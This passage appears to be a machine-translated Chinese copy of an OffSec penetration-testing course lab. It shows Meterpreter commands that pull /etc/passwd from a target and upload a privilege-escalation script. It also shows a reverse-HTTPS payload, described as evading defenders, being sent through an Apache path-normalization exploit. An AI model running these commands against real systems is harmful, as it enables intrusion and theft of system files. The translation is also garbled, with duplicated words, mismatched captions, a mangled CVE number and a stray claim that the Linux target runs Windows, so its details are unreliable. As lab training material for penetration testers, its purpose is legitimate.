

# OffSec 上传文件或目录

upload

列表 656 - 列出 Meterpreter 所有文件系统命令

列表 656 向我们展示了可以用于在本地和目标系统上上传、下载或管理文件的各种命令。在本地系统（在本例中是 Kali 虚拟机）上，命令以 "t" 作为前缀。例如，我们可以使用这些命令切换切换到我们想要下载或上传文件的目录。

让我们从目标机器将 `/etc/passwd` 下载到我们的 Kali 系统。为此，我们首先将本地目录更改为 `/home/kali/Downloads`。然后，我们输入下载命令并将 `/etc/passwd` 作为参数。

```
meterpreter > lpwd
/home/kali/

meterpreter > lcd /home/kali/Downloads

meterpreter > lpwd
/home/kali/Downloads

meterpreter > download /etc/passwd
[*] Downloading: /etc/passwd ~ /home/kali/Downloads/passwd
[*] Downloaded 1.74 KiB of 1.74 KiB (100.0%): /etc/passwd ->
/home/kali/Downloads/passwd
[*] download : /etc/passwd ~ /home/kali/Downloads
```

```
meterpreter > cat /home/kali/Downloads/passwd
root:x:0:0:/root:/bin/bash
```

列表 657 - 修改本地目录并从目标机器下载 /etc/passwd

列表 657 显示我们成功地将 `/etc/passwd` 下载到了我们的本地机器。

接下来，让我们假设在特权模块中运行 `unix-privvesc-check`⁶ 来寻找权限提升向量。让我们使用目标系统上的文件 `/tmp`。

```
meterpreter > upload /usr/bin/unix-privvesc-check -> /tmp/
[*] uploading : /usr/bin/unix-privvesc-check -> /tmp/
[*] uploaded : /usr/bin/unix-privvesc-check -> /tmp/unix-privvesc-check

meterpreter > ls /tmp
Listing: /tmp
======================
```

| 模式 | 大小 | 类型 | 最后修改时间 | 名称 |
|---|---|---|---|---|
| 100644/rw-r--r-- | 36801 | fil | 2022-08-08 05:26:15 -0400 | unix-privvesc-check |

列表 658 - 修改本地目录并从目标机器下载 /etc/passwd

> ⁶(Github, 2021), https://github.com/pentestmonkey/unix-privvesc-check

PWK - Copyright © 2023 OffSec Services Limited. 版权所有。

# OffSec

列表 658 显示我们已将 `unix-privesc-check` 上传到目标机器。我们的目标运行的是 Windows 操作系统，我们需要使用反斜杠 `\\\` 来转义目标路径中的反斜杠。

到为止，我们在这一节中使用了 `linux/x64/meterpreter_reverse_tcp` 载荷来探索 Meterpreter 的各种功能。在进入下一节之前，让我们使用另一个 64 位 Linux Meterpreter 载荷。因此，我们退出当前会并在并在模块的上下文中再次使用 `show payloads`。

```
meterpreter > exit
[*] Shutting down Meterpreter...
[*] 192.168.50.16 - Meterpreter session 4 closed. Reason: User exit
msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads
```

兼容载荷

| 检查描述 | 披露日期排名 |
|---|---|---|
| 10 payload/linux/x64/meterpreter_https | normal 否 |
| Linux Meterpreter, Reverse HTTPS Inline | | | |

> 列表 659 - 显示 Meterpreter HTTPS 非分阶段载荷

列表 659 显示索引 10 是 `payload/linux/x64/meterpreter_reverse_https`。该载荷没有使用原始 TCP 连接，而是使用 HTTPS 在受感染目标与我们的 Kali 机器之间建立连接和通信。由于流量通过 SSL/TLS 加密，防御者只会获得有关 HTTPS 请求的信息。在没有进一步防御技术手段的情况下，他们很难检测到 Meterpreter 的通信。

让我们选择载荷并显示其选项。

```
msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 10
=> linux/x64/meterpreter_reverse_https
...
msf6 exploit(multi/http/apache_normalize_path_rce) > show options
....
```

载荷选项（linux/x64/meterpreter_reverse_https）：

| 名称 | 当前设置 | 需要 | 描述 |
|---|---|---|---|
| LHOST | 192.168.119.2 | 是 | 本地监听主机名 |
| LPORT | 4444 | 是 | 本地监听端口 |
| LURI | 否 | HTTP 路径 |
| ... | | | |

> 列表 660 - 显示 Meterpreter HTTPS 非分阶段载荷

# OffSec

使用 Kali Linux 进行渗透测试

列表 660 显示了该载荷的额外选项 `LURI`。此选项可以利用单个监听器，根据此选项中的路径来管理不同请求的处理，并提供逻辑隔离。如果此选项为空，Metasploit 将使用 `/` 作为路径。

现在，让我们在不为 `LURI` 选项设置值的情况下输入 `run` 来利用该模块。

```
msf6 exploit(multi/http/apache_normalize_path_rce) > run
[*] Using HTTPS reverse handler on https://192.168.119.4:4444
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[*] http://192.168.50.16 - 目标存在 CVE-2021-4213 漏洞 (mod_cgi 已启用)
[*] Scanned of 1 hosts (100% complete)
[*] http://192.168.50.16 - 尝试利用 CVE-2021-4213
[*] http://192.168.119.4:4444 - 正在发送 linux/x64/meterpreter_reverse_https 载荷
[*] http://192.168.119.4:4444 - Sending linux/x64/meterpreter_reverse_https payload
[*] http://192.168.119.4:4444 - Sending linux/x64/meterpreter_reverse_https payload
[*] http://192.168.119.4:4444 - Sending linux/x64/meterpreter_reverse_https payload
```

